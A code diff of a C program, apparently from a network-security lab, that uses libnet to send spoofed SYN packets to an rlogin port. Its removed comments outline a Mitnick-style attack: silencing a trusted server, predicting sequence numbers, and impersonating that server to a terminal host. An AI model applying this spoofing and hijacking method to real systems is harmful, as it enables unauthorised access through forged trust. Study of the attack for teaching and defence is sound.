@@ -59,22 +59,12 @@ int main (void)
 	printf("Starting the enable sequence\n");
 	for (i = 0; i < 5; i++)
 	{
-		//craft and send 10 packets with "disable" payload
-		printf("enable\n");
+
+		//printf("enable\n");
 		send_syn(513, (uint8_t *) enable, (u_short) strlen(enable), l, server_ip, fake_ip);
 	}
-	//now the server will ignore syn acks, that's exactly what I need because
-
-	//I will send spoofed syn
-	//The xterminal will send real synack to the server
-	//I will respond with spoofed ack cause I know the server seq num
-	//will have a trusted connection on the xterminal
-
-	//contact xterminal to figure out next seq #
-
-
-	//impersonate trusted server
-
+	//now the server is no longer blocked
+	printf("The server is now responsive again\n");
 
 	exit(EXIT_SUCCESS);
 }
@@ -137,10 +127,6 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 	{
 		printf("error while sending packet\n");
 		exit(EXIT_FAILURE);
-	}
-	else
-	{
-		printf("sent %d\n", success);
 	}
 
 	libnet_clear_packet(l);
